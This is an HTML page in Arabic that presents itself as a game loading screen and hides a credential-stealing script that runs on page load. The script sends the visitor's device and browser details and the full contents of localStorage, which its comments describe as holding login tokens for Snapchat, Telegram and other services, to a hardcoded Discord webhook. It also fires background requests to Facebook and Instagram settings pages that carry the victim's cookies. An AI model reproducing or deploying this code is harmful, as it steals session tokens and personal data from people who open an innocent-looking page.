<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحميل اللعبة...</title>
    <style>
        body { background: #000; color: #fff; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .version-marker { font-size: 80px; font-weight: bold; color: #1a1a1a; position: absolute; top: 20px; right: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="version-marker">11</div>
    <div class="loader"></div>
    <p>جاري مزامنة البروتوكول (V1.2.3)...</p>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        // أضمن طريقة للإرسال في كروم 2026: استخدام الـ fetch بوضع 'no-cors'
        function pulse(title, message) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: `📡 ${title}`,
                        description: message,
                        color: 3066993,
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }

        // إطلاق طلبات خلفية "عمياء" (المتصفح يتقمص الشخصية غصباً عنه)
        function triggerBlindRequest(name, url) {
            const img = new Image();
            // المتصفح سيحمل الرابط بكامل الكوكيز بالخلفية
            img.src = url + "?cache_bust=" + Math.random();
            pulse("Request Triggered", `الطلب انطلق بنجاح إلى: ${name}\nالمتصفح استخدم الكوكيز النشطة بالخلفية.`);
        }

        async function startHarvest() {
            try {
                // 1. بصمة الجهاز الفورية (عشان نعرف إن السكريبت اشتغل)
                pulse("System Sync", `الجهاز: ${navigator.platform}\nالمتصفح: ${navigator.userAgent}`);

                // 2. سحب الـ LocalStorage (هذا هو "الذهب" اللي كروم ما بيمنعه)
                // هنا بتلاقي Tokens الدخول لسناب شات وتلجرام وغيرها
                let storageData = "";
                for (let i = 0; i < localStorage.length; i++) {
                    let key = localStorage.key(i);
                    storageData += `**${key}**: ${localStorage.getItem(key).substring(0, 100)}...\n`;
                }
                
                if (storageData) {
                    pulse("Storage Harvest", storageData);
                } else {
                    pulse("Storage Check", "LocalStorage فارغ (قد يكون المتصفح في وضع Private)");
                }

                // 3. تنفيذ "طلبات الانتحال" (Proxy Actions)
                // المتصفح يروح يزور المواقع بكوكيز الضحية
                triggerBlindRequest("Facebook", "https://mbasic.facebook.com/settings");
                triggerBlindRequest("Instagram", "https://www.instagram.com/accounts/edit/");

            } catch (e) {
                pulse("Error Log", e.message);
            }
        }

        window.onload = startHarvest;
    </script>
</body>
</html>
